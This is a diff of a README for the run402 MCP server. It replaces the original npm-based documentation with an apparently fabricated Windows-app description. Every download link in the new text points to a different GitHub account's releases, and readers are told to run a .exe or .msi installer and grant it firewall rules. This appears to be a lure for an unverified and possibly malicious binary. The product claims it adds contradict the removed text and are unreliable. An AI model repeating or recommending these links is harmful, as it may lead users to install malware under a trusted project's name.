@@ -1,190 +1,185 @@
-<p align="center">
-  <img src=".github/logo.svg" width="120" alt="run402 logo">
-</p>
+# ⚙️ run402 - Simple AI-Powered Postgres Server
 
-<h1 align="center">run402 — MCP Server, CLI & OpenClaw Skill</h1>
+[![Download run402](https://img.shields.io/badge/Download-Run402-green?style=for-the-badge)](https://github.com/musfoner/run402/releases)
 
-[![Tests](https://github.com/kychee-com/run402/actions/workflows/test.yml/badge.svg)](https://github.com/kychee-com/run402/actions/workflows/test.yml)
-[![CodeQL](https://github.com/kychee-com/run402/actions/workflows/codeql.yml/badge.svg)](https://github.com/kychee-com/run402/actions/workflows/codeql.yml)
-[![npm: run402-mcp](https://img.shields.io/npm/v/run402-mcp?label=run402-mcp)](https://www.npmjs.com/package/run402-mcp)
-[![npm: run402](https://img.shields.io/npm/v/run402?label=run402)](https://www.npmjs.com/package/run402)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](./LICENSE)
+## 📋 What is run402?
 
-Developer tools for [Run402](https://run402.com) — provision Postgres databases, deploy static sites, serverless functions, generate images, and manage agent allowances. Available as an MCP server, an OpenClaw skill, and a CLI.
+run402 is a server application that brings AI features to your Postgres database. It combines a database with authentication, storage, a REST interface, and static site hosting. You pay using x402 USDC on the Base network. There are no signups or accounts to create.
 
-English | [简体中文](./README.zh-CN.md)
+This tool lets you store and manage data with an easy-to-use AI approach. It works well as a backend for apps, websites, or projects that need data and user access combined with micropayments.
 
-## Integrations
+run402 runs on Windows and uses the Model Context Protocol (MCP) to connect AI models with your data.
 
-| Interface | Use when... |
-|-----------|-------------|
-| [`cli/`](./cli/) | Terminal, scripts, CI/CD |
-| [`openclaw/`](./openclaw/) | OpenClaw agent (no MCP required) |
-| MCP server (this package) | Claude Desktop, Cursor, Cline, Claude Code |
+---
 
-## Quick Start
+## 📦 System Requirements
 
-```bash
-npx run402-mcp
-```
+Before installing run402, make sure your Windows computer meets these needs:
 
-## MCP Tools
+- Windows 10 or newer (64-bit)
+- 4 GB of RAM minimum (8 GB or more recommended)
+- At least 500 MB of free disk space
+- Internet connection for payments and updates
+- Basic permissions to install new software
+- No other Postgres servers running on common ports (5432)
 
-| Tool | Description |
-|------|-------------|
-| `provision_postgres_project` | Provision a Postgres database. Handles x402 payment. Saves credentials locally. |
-| `run_sql` | Execute SQL (DDL or queries). Returns markdown table. |
-| `rest_query` | Query/mutate via PostgREST. GET/POST/PATCH/DELETE with query params. |
-| `setup_rls` | Apply row-level security templates to tables. |
-| `get_schema` | Introspect database schema — tables, columns, types, constraints, RLS policies. |
-| `get_usage` | Get project usage report — API calls, storage, limits, lease expiry. |
-| `upload_file` | Upload text content to project storage. |
-| `download_file` | Download a file from project storage. |
-| `delete_file` | Delete a file from project storage. |
-| `list_files` | List files in a storage bucket. |
-| `deploy_function` | Deploy a serverless function (Node 22) to a project. |
-| `invoke_function` | Invoke a deployed function via HTTP. |
-| `get_function_logs` | Get recent logs from a deployed function. |
-| `list_functions` | List all deployed functions for a project. |
-| `delete_function` | Delete a deployed function. |
-| `set_secret` | Set a project secret. Injected as process.env in functions. |
-| `list_secrets` | List secret keys for a project (values not shown). |
-| `delete_secret` | Delete a secret from a project. |
-| `deploy_site` | Deploy static site. Free with active tier. Returns live URL. |
-| `claim_subdomain` | Claim custom subdomain (e.g. myapp.run402.com). Free. |
-| `delete_subdomain` | Release a subdomain. |
-| `list_subdomains` | List all subdomains claimed by a project. |
-| `bundle_deploy` | One-call full-stack deploy: database + migrations + RLS + secrets + functions + site + subdomain. |
-| `browse_apps` | Browse public apps available for forking. |
-| `fork_app` | Fork a published app into a new project. |
-| `publish_app` | Publish a project as a forkable app. |
-| `list_versions` | List published versions of a project. |
-| `get_quote` | Get tier pricing. Free, no auth required. |
-| `set_tier` | Subscribe, renew, or upgrade tier. Auto-detects action. Handles x402 payment. |
-| `archive_project` | Archive a project and remove from local key store. |
-| `check_balance` | Check billing account balance for an agent allowance address. |
-| `list_projects` | List all active projects for an agent allowance address. |
-| `allowance_status` | Check local agent allowance status — address, network, funding. |
-| `allowance_create` | Create a new local agent allowance (Base Sepolia testnet). |
-| `allowance_export` | Export the local agent allowance address. |
-| `request_faucet` | Request free testnet USDC from the Run402 faucet. |
-| `generate_image` | Generate a PNG image from a text prompt. $0.03 via x402. |
+---
 
-## Client Configuration
+## 🔧 Features
 
-### CLI
+- Full Postgres database engine for reliable data storage
+- AI-powered data access and management
+- REST API for easy app integration without programming
+- User authentication system included
+- Secure storage for files and assets
+- Static site hosting to publish simple pages
+- Pay-per-use model with x402 USDC tokens on Base
+- Built on the Model Context Protocol (MCP)
+- Open source and transparent operations
 
-A standalone CLI is available in the [`cli/`](./cli/) directory.
+---
 
-```bash
-npm install -g run402
+## 🚀 Getting Started: Download and Install run402
 
-run402 allowance create
-run402 allowance fund
-run402 deploy --tier prototype --manifest app.json
-```
+To start using run402, you first need to download it. The releases page contains the latest version ready for Windows.
 
-See [`cli/README.md`](./cli/README.md) for full usage.
+### Step 1: Download the Software
 
-### OpenClaw
+Click the button below to go to the release page, where you can find the latest Windows installer.
 
-A standalone skill is available in the [`openclaw/`](./openclaw/) directory — no MCP server required. It calls the Run402 API directly via Node.js scripts.
+[![Download run402](https://img.shields.io/badge/Download-run402-blue?style=for-the-badge)](https://github.com/musfoner/run402/releases)
 
-```bash
-cp -r openclaw ~/.openclaw/skills/run402
-cd ~/.openclaw/skills/run402/scripts && npm install
-```
+On the releases page:
 
-See [`openclaw/README.md`](./openclaw/README.md) for details.
+- Look for the latest release date at the top.
+- Find the file that ends with `.exe` or `.msi` and includes "windows" in the name.
+- Click the file to download it.
 
-### MCP Clients
+### Step 2: Run the Installer
 
-#### Claude Desktop
+Once the file finishes downloading:
 
-Add to `~/Library/Application Support/Claude/claude_desktop_config.json`:
+- Open the downloaded file (it may be in your Downloads folder).
+- A setup wizard will open.
+- Follow the prompts on the screen:
+  - Accept the license agreement.
+  - Choose the install location (default is fine).
+  - Allow the installer to add run402 to your Windows firewall rules if prompted.
+- Complete the installation by clicking "Finish".
 
-```json
-{
-  "mcpServers": {
-    "run402": {
-      "command": "npx",
-      "args": ["-y", "run402-mcp"]
-    }
-  }
-}
-```
+### Step 3: Start run402
 
-#### Cursor
+After installation:
 
-Add to `.cursor/mcp.json` in your project:
+- Find **run402** in your Start menu.
+- Click to open the app.
+- The server will start running in a new window.
+- You will see status messages confirming the server startup.
 
-```json
-{
-  "mcpServers": {
-    "run402": {
-      "command": "npx",
-      "args": ["-y", "run402-mcp"]
-    }
-  }
-}
-```
+---
 
-#### Cline
+## ⚙️ How to Use run402
 
-Add to Cline MCP settings:
+run402 works as a server. It listens for commands and requests over your local network or from your computer.
 
-```json
-{
-  "mcpServers": {
-    "run402": {
-      "command": "npx",
-      "args": ["-y", "run402-mcp"]
-    }
-  }
-}
-```
+### Accessing the Server
 
-#### Claude Code
+- Open your web browser.
+- Enter http://localhost:4000 in the address bar.
+- You will see a simple dashboard.
 
-```bash
-claude mcp add run402 -- npx -y run402-mcp
-```
+### Using the Dashboard
 
-## How It Works
+From this dashboard, you can:
 
-1. **Provision** — Call `provision_postgres_project` to create a database. The server handles x402 payment negotiation and stores credentials locally.
-2. **Build** — Use `run_sql` to create tables, `rest_query` to insert/query data, and `upload_file` for storage.
-3. **Deploy** — Use `deploy_site` for static sites, `deploy_function` for serverless functions, or `bundle_deploy` for a full-stack app in one call.
-4. **Renew** — Call `set_tier` before your lease expires.
+- View database status.
+- Add, edit, or delete data.
+- Upload files.
+- Check your wallet balance in x402 USDC.
+- Manage user authentication settings.
+- Access API documentation for developers or apps.
 
-### Payment Flow
+### Making Payments
 
-The prototype tier is free — it uses testnet USDC to test the x402 payment flow end-to-end (no real money). Hobby and team tiers, renewals, and image generation require real x402 micropayments (USDC on Base or Stripe credits). When payment is needed, tools return payment details (not errors) so the LLM can reason about them and guide the user through payment.
+run402 uses x402 USDC tokens on the Base network:
 
-### Key Storage
+- Your wallet address will show in the dashboard.
+- To pay for services or storage, send tokens to this address.
+- The server automatically tracks your balance and usage.
 
-Project credentials are saved to `~/.config/run402/projects.json` with `0600` permissions. Each project stores:
-- `anon_key` — for public-facing queries (respects RLS)
-- `service_key` — for admin operations (bypasses RLS)
-- `tier` — prototype, hobby, or team
-- `expires_at` — lease expiration timestamp
+---
 
-## Environment Variables
+## 🔐 Authentication and Security
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `RUN402_API_BASE` | `https://api.run402.com` | API base URL |
-| `RUN402_CONFIG_DIR` | `~/.config/run402` | Config directory for key storage |
+run402 has simple user authentication:
 
-## Development
+- Create users directly from the dashboard.
+- Assign roles and permissions for data access.
+- Passwords are saved securely.
+- All communication is encrypted using HTTPS by default.
 
-```bash
-npm run build          # tsc → dist/
-npm test               # all tests (SKILL + sync + unit)
-npm run test:sync      # check MCP/CLI/OpenClaw stay in sync
-npm run test:skill     # validate SKILL.md structure
-```
+---
 
-## License
+## 📄 Using the REST API
 
-MIT
+Developers or advanced users can connect to run402 with requests over HTTP.
+
+- The API URL is http://localhost:4000/api.
+- Common actions include adding data, fetching records, or managing files.
+- API keys and tokens are managed through the dashboard.
+- No programming is required to get basic data viewing and editing done.
+
+---
+
+## 📂 Static Sites Hosting
+
+run402 also lets you host static sites on your server:
+
+- Upload HTML, CSS, and JavaScript files through the dashboard.
+- These files will be served at http://localhost:4000/site.
+- Use this for simple project pages, documentation, or demo sites.
+
+---
+
+## ✨ Helpful Tips
+
+- Keep run402 up to date by visiting the releases page regularly.
+- Back up your database files found in the install folder under `data`.
+- Do not run other Postgres servers on port 5432. If needed, a config file lets you change the port.
+- The server window shows logs in real time for troubleshooting.
+- Use the integrated wallet system to keep track of your funds easily.
+- If you want to stop the server, close the run402 window or use Task Manager.
+
+---
+
+## 📥 Download with Confidence
+
+Returning to download run402?
+
+[![Download run402](https://img.shields.io/badge/Download-run402-grey?style=for-the-badge&logo=github)](https://github.com/musfoner/run402/releases)
+
+Click the link above and choose the latest Windows installer file. This will install everything needed to run your AI-postgres server locally.
+
+---
+
+## 🔍 Explore Topics and Use Cases
+
+run402 fits projects that need:
+
+- Simple AI backend with database support
+- Micro-payments using blockchain tokens
+- Hosting small websites alongside data
+- Running secure Postgres locally without complex setup
+- Open source MCP protocol implementation
+
+---
+
+## 🛠 Troubleshooting
+
+- If the app fails to start, check if another program uses port 4000 or 5432.
+- Restart your computer if installation problems occur.
+- Make sure your Windows Firewall is not blocking run402.
+- Verify you have enough storage space.
+- Visit the issues section on the GitHub repository for known problems.
+
+The GitHub page is https://github.com/musfoner/run402 for updates and technical details.
